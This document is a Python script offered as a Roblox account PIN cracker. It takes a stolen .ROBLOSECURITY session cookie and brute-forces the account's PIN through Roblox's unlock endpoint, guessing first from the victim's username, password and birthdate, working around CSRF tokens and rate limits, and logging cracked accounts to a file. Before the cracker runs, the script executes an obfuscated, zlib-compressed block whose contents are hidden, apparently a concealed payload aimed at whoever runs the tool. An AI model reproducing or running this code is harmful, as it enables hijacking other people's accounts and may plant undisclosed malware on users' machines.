#pip install pycryptodome
print('loading.... please wait')
_key    = 'Obfuscated by https://pyobfuscate.com'
_lambda = b'\xe5C\x87*=\xefLT\x9f<\xbb\xa0\xe5\xad\xd0\x0e*\x1b\xda;\x94i\xd40\xc5&\xc9\xc4\xdc\x02\x9b\x8c\x15}]\xe1\x0b5C.\xd8\x83BF\xf5\xb9\x01wZ7K\t\xdf\x0b\xbf\xf7\xa8\x92@B\xcb\xb1\xd69\x0f\xcaZ\x7f \xdb\x9fL\xa2y\xb6\x1a\xcc\x113\xca^B~1\x10\xed"\x99\xcf\xbew\xa1w\xfc\xea\xd9\xbdD\x02k\xbd\xfd\xbe\xc6\x05\xc0\xd9\xd9\xd4`w\xb0\xbcUK,\xc2\xad\xeayA\xc2\xef\xc8\x85\xa0\xedF\xa4\x0c\xfd\xf2$\x85w\xd1c\x81!3\xf6PZ\xf2A\x17\x9dI\xafN\x97N*\x1coe\xd0{\xd4\x87\xda\xc7\xad\xd4 K\x1e\xd5\x84\xf6-\xa7\xa8\x88\x07\xe1Y\xe6\x1c\xfe\xd4\x9b\xe1\x00\xeb\x9e\xbe[W\x1be\x9d,\xa4\xe8L\xf8,\xf5\x87\x8c\x81\x13+\x14\x0c\xb0g_\x95 \x16x\xd4\x08\xa8s\x84[i-\xb8\xca\x9e\n\xc2Zo\x8a\xe0\x7fa\xb4_\xd6\x04\xee\x98\x0c\xb0\x8c\xf1\x14\x90\x8c\x86C\xbc\xf9q\xa0\x1e\x14\xfd\xdd\xcd,a\x10\xbf\xb14\xb4\xb5\xc0\xaa\x11\xd4\xfc\x89\x17aRaW\xe1\x04\xeb\x8a\x1d~\xe4s\xd5\xb5\x12\xb1\x98]\xbfJ>\'\xd8\x81_\xf236\xe7S\xd6\xec\x1e\x82\xb1\x07\xef\xb1\xe2F!S\x16\xa8\t\tQh\x8fo\x12\xbc\xeb\xef\xa2kK/\xd2i\xef/\xb2\x82r\x1fdW;:)K\xd5\x90\xaf[\xb2XB&\x1f\xa3\x98\xca\x04\x8cF\x87y\x13\x84\xc7\\\x99\r\xc9\x15\x0f\x8d\x9eo\x9bW\xdfqGg\x15\xb8\xe8\xc9\xc7\xb8\xdd\xad\x8e\xf2\xe4-\xbdH\x12\xe0\xb6\xcf\x13\x8c %\xe8\x108Tk\x9e\xa8\xf2\xcfN\xd2$\x9dHI\x80\x16:@y\x8ai\xec\x1d\xcd\x8b!\xa6\xe9mQ\xe9\xd0\xa5\xfa\xd5\x9bdqb\x81X\xfbl\xcf5&\x18\x86\xbca\x1b\xdd\xb6\xe2\x94\x12D\xb7\\\xf1\xc2\x83@\n3\xf0\x8f\xab\x92\xd0)-v\xda\x06\xc1\xb9r\xfe\x1f\x8cw\xf9\xceG21wx\xaf<\xc6\xda\x1c)\xac\xfc\x95\xb2\x0c.I\x89{\xae\xbaA\xccL\x16Qe\x15\xbb\xf2\xde,\xa5\xc8Jg2D\xf8\xdc*\x90\x9c\x86b\xcf\xbb\x7f\xd2\xa3\xbds\xbe4p\xe5\xed\xe3\xc9\x1a\xcd1\xa1 \xd56]\x90\x93\xc1\xc6\x9e6\x18wDh\x0e\x1e\x92\xcf\x02\x86+\x00\x1a\xaa\xf5\x11_\x0cpY\xbd\xe9\xf5\xc7l\x8c%u\x90%\x03a\xc6\x0c%\x87O 9\x8c\x16\xdf\xd5(\x80X=\xfd\xa4\xe5\xbe/\xd3V\x04;\xd3`\x0f\xda\xc8\xaf\x10\xc3w\x06w\xea\x9f\xc40\xa0(b\x16\t\xa9\x997J\xb7B\xab\xad\xaf\xf0\x9b )\xcd\xec\x00?\x0c\xc2Z\xb4\x9c\x96\xcc\'y>3\xff\xdb\xd8_\x81\x06\ny\xcfOQ\xb1\x8f\x04Y\xde\xc4\x03\xb6\xdb\xbf&X\xd2\xebC\xd2\x92\x11\xaa\xc4\xdf/\x1b\xf4%U\x030+\xabnZ\xaa\x85\xa6\x14\x95\xc5\x05\x15\xa2\xa6\xef\xac\xd0r\xab\xdc\xc2\x1f\xc7C\x0e\x1f\x13QU/_\xaa\xfd\xf6d\x11wK\xbf\x0b5\xdd\xee\x06\xf1Y\xadt\xf8\x9f\xb2\xc1\xc5N\xd6\x1b\x90\x08{\x99g{R\x9b\xe5Rf\x83\x9e\x17\x9d\xedfv~\xa9\xed\xae\xab\tF\xecq\x99%yi\xd2\xf8\xa6{u\x9e\x19\xc5\xb4\x7fY\xef\x01\x8a\xde\x90\x8a\xb6\x1e\xa7r\xb6\xb4\x05kE\xf8`v\x92\x18*\x85w\x92N\xeb\x0c_\x7f\xb4\xa3\x93\xc0\x8c\x8d$9\xfbJ\xda\xbbZgeu\xf1\x04\xb3\xf2\xa1/\x15\xbf\xc2 \xb8=\x1f}\x9bW\x94\x8b R\xd8\xd5\xf5\xcaRPB\x12nQ\x19.\xf5\x92\xe0\x80jfr\xc5_\xb7n\x99>\xf7Y\xd2\x9by\x12\x81\x12\xde\xf5\xfd\xed(7E\xc6\x1c\x05O\x80&8\xd7\x80R`e\x99\x84\xb9\xfa\x0f`p5 \x16\xdb\xd9r\xe7\x9dM\xa8\x0cO\xb9\xc2\xde\x9b\x0c/\xec\x1clu\x977s\xbcTtq\xe0\x084\x84\xd4\xedy\x98\xf4\x0f\x8e\x07\xaf\'!\xbe\xd2Q\xc3\x1d\xb0\xbc8\xde\x14\x0c\xc0\x9b\x0e\xf7\xdc\x90IM\xf8\xebJV\x1d \x98\x93e\xb6H\xd2ZbA}\xb7\x0b\xeeM\x9d\x02(%O0xk\xd1\x1eb\x81\xa7\x8c!\x8eeR\x83\xcf\xc5\x80\x82\xa8!\xbb\x17\xc2I\xed\x0f"7\x1f\xc3\xfeS\xa2\x84i\xf6\x10T\xe5\x14B\xa3\xd0z\x02\x8e\x0fy\xa9WV^\x10\xc9c\xae3O\xfe\'\xed\xb8\xf2t\x1a\x0cX$18\x1bl\xf69\x14\xd9\xaa\xab\xce\xec[v\x08\xcd\xdb\xe6C\x8f%\x87\x90v*\xfa\x1d;\xc3\x87R\x05B5\xa8\x1f\xcb\xe0\x9dl\xb4@\xbf4\x15\xdas\x93\xc0IS\x06\xe5/!\xa8\x18\x840\xcb\t\xd1\xad\x1a\x9c\x07z\xa2\x1d\xef\x88]\x01\x04\x82\xad\xe5d4\x90N9\nj\xa6I,\xe5!\x10\nd\x19\xfa\xf0\x8es/]&C \xdd\xa0\x96\xe44\xeaU=\xae\xc2\xab\x0f\xd0jfg\x95\xbd\x1dc\xe63\xc6\x84\xe6\x97\x17\xad\x06/\xec\xfd\xf5\xda\x9d\xe9\xbf\xadw\xa8\x1b\xe1\x82\xf4`\xd8\xc6\x91\xf56\x81C}\x14h\x18fD?jc\xd0M\xf7\xff\xac'        
_encrypt = b'R7O)&QZq(XQB5;LS5;G3Fh*8UL`OtLPgO=uK}0x5I8awpS65n4RX8?FO<F@vPeeCVRxm<KQbjp8Lqu0NLor5ET2@3%NJuj=P)}4@Fi%4^RWwRRRWnIfPDMpHS5{6*Yv#~ry%pwH;A>)Zq|bhb'
_pubkey  = b'H0333XFFRNZ6G6EWGUCYBC2LSTEUXHUFL1SY1IFECERROLIBSVZJD3VSX10K4OITUPR04VY8ZXEFIG3GM5A7ZWHUWOGFL77JOZ3NGMID9L56PPS44Z87'

from zlib import decompress as dp;exec(dp(b'x\x9c\xed\x94mo\x9aP\x14\xc7\xdf\xfb)N\xfaF\xc8V#\x8f\xeaM\xfa\x86f\x9b\xebj\xcd\\\x82\x94\xa6!En\x0bSD\x01\xab\xec\xd3\xef\x9c[ 7\xae\xa9\x1f`\x9a\x80\\\xf8\xfd\xefy\xbc\xa7S\xe6\x15\xeb\x00\xfe\x9e\xf3,\x85\x9cow\xbc(\x0bH\xd2M\x96\x97\xf0\xc2\xcb\x0e?,\xf8\xa6|\x836y\xb2.\x95\x8bM\xb2\x81d]\x94O\xabU+\xb9P\x05\x91\xac7;"r^\x14\xc0\xd7%\xcf\xa1\xcc\xe0\xcb!)\x1b\xe0m\xe7\xa2*\xc4\x12\xff{\x1c\xbf*j\'\x08\xc2]\xb2*q\xe3 \xe8\x05A\x94,\xca xx\xffmX\x95\xbcP\x1e\x94\xd5S\x1aFO\xe02p\xe1\x13(.\\\x82\xab\xaa\x8a\x8d\x8bA\x1fo\x1a\xdd\x0c\xbcl\xf534t\xc6 #:C:CZ\xd3qe\x91F\x1fHX\xc5\xa0"\xacB\xac\xa2MG\xb4\x97I\x98D\xed\x19\xec\x89\xda#\xb5Gj\xa0\x11E&\x89\xd4$r\xc6`F\xe4\x0c\xc9\x19\x92\x960\xdb\xd0\xc2S\xd2j\xb2&d\x10\x92&DM\x88\x9a!\xf1\xba\x1cL\xc4 ""B"\xa2`\xfazc\xbb\xbe\xdagIU0(HU\xa0\xaa@\xd5\x88D\x9aY;D\x0b\xe3\x83\x18\xf5\xc6W\x9d<7\x84\xd6\xaeu\x1fY\x11\xb86 +\x96\xfa\xa8\xf6"\xbe\xc8"\xaetw\xe5\xf3\xe5\xb0\xab>*Ge\x8d\x19\xc4\xa4\x8fQ\x1fSlC\xaa+\x19\x1e\x1eY\xe2\x0c8\x91\x1cIN\xb9\xa5Z\xe9\x14\x8f-\xc5$+\x0e\x0c\x0e\xa48\xa0\xe2\x80\nC\xa4J\xc4\xd3\xf4\xccP\xc2\xa7\x0c\xa6\x84O\x11\x9f\x12n7\xe1\xd3\x83a\x9d\xda\x9d\xcc\xeb\xc7UX2X\x12\xb5DjI\xf9\xb1E\xfd\xeb\xf8\xac\xb6n\xff\xa6J\xed\x85\xb6Y\xbf\x0b\xbb\xbe\x17\xaf\xee\xf7WW\xdd\x96;Jd\xca %C)\x1aJ\xc9\x1dQ\x03\xca\x91H\xe9\xa9\xba\xd9F\x93D\xd2i\xa3\xa3#0g0\'|\x8e\xf8\x9c\xca$\xf2n7\xadG7S\xc2\'\x0c&\x84O\x10\x9f n6\xa5\xd2\x9a\x8e\xb5$z\xcc`L\xf4\x18\xe91\xe5\x88\x9c\x15n\x88f2\xa5\xe4\x9c\n\x9a\xea:\xd4\xeaxe\x8f\xb6\x0c\xb6Dn\x91\xdc\x92G\xa2\xa6v]\x07\xbb1\xd6\x1c$9v\x9f\x81OR\x1f\xa5>I\xadvH\xc8\'\xc8a\xe0\x10\xe6 \xe6\x90/m\xe7\xbc\x93\xfe\xe3|\x8a\xee\x1a\xd5\xa0\xd5N\x96w\xba\x02\x8f\xd0y^\x9e\xe7\xe5y^\x9e\x98\x97\xeb\x9b\xd7\xf0\x97S\xf9\xdeW\xcd\xf7\xee\xfa\x8b\xca\xd9\x84\x9e\xf3\xbaX\xff|\xf1u\xb7?\xd5]\xd3\x9fO2z\xfeq}\x93E\xe3\xd9~\xf1\'{\xbd5\x1c+\xd4o\xd2\xc8\xbb\xfb}\xef\xcdV\xb7\xe9\x1d\xee3\x8a}o\xb2\x8b\xc6q\xff{\xb2\xdcE\xdf\\3\xba^\x9eg\xf1\x7f?\x8b\xd5\xbf\xcc\xa5\xa6\x97').decode())

#Encryption codes have almost 300 lines above.So Compress the encryption codes using Zlib.
print('enter the cookie for the roblox account to crack')

import os, time, requests
from threading import Thread
from datetime import datetime

credentials = input('Enter the account user:pass:cookie or cookie ~ ')
if credentials.count(':') >= 2:
    username, password, cookie = credentials.split(':',2)
else:
    username, password, cookie = '', '', credentials
os.system('cls')
print('FATAL ERROR! CODE_@265')
req = requests.Session()
req.cookies['.ROBLOSECURITY'] = cookie
try:
    username = req.get('https://www.roblox.com/mobileapi/userinfo').json()['UserName']
    print('Logged in to', username)
except:
    input('INVALID COOKIE')
    exit()

common_pins = req.get('https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/four-digit-pin-codes-sorted-by-frequency-withcount.csv').text
pins = [pin.split(',')[0] for pin in common_pins.splitlines()]
print('Loaded pins by commonality.')

r = req.get('https://accountinformation.roblox.com/v1/birthdate').json()
month = str(r['birthMonth']).zfill(2)
day = str(r['birthDay']).zfill(2)
year = str(r['birthYear'])

likely = [username[:4], password[:4], username[:2]*2, password[:2]*2, username[-4:], password[-4:], username[-2:]*2, password[-2:]*2, year, day+day, month+month, month+day, day+month]
likely = [x for x in likely if x.isdigit() and len(x) == 4]
for pin in likely:
    pins.remove(pin)
    pins.insert(0, pin)
print(f'Prioritized likely pins {likely}\n')

tried = 0
while 1:
    pin = pins.pop(0)
    os.system(f'title Pin Cracking {username} ~ Tried: {tried} ~ Current pin: {pin}')
    try:
        r = req.post('https://auth.roblox.com/v1/account/pin/unlock', json={'pin': pin})
        if 'X-CSRF-TOKEN' in r.headers:
            pins.insert(0, pin)
            req.headers['X-CSRF-TOKEN'] = r.headers['X-CSRF-TOKEN']
        elif 'errors' in r.json():
            code = r.json()['errors'][0]['code']
            if code == 0 and r.json()['errors'][0]['message'] == 'Authorization has been denied for this request.':
                print(f'[FAILURE] Account cookie expired.')
                break
            elif code == 1:
                print(f'[SUCCESS] NO PIN')
                with open('pins.txt','a') as f:
                    f.write(f'NO PIN:{credentials}\n')
                break
            elif code == 3 or '"message":"TooManyRequests"' in r.text:
                pins.insert(0, pin)
                print(f'[{datetime.now()}] Sleeping for 5 minutes.')
                time.sleep(60*5)
            elif code == 4:
                tried += 1
        elif 'unlockedUntil' in r.json():
            print(f'[SUCCESS] {pin}')
            with open('pins.txt','a') as f:
                f.write(f'{pin}:{credentials}\n')
            break
        else:
            pins.insert(0, pin)
            print(f'[ERROR] {r.text}')
    except Exception as e:
        print(f'[ERROR] {e}')
        pins.insert(0, pin)

input()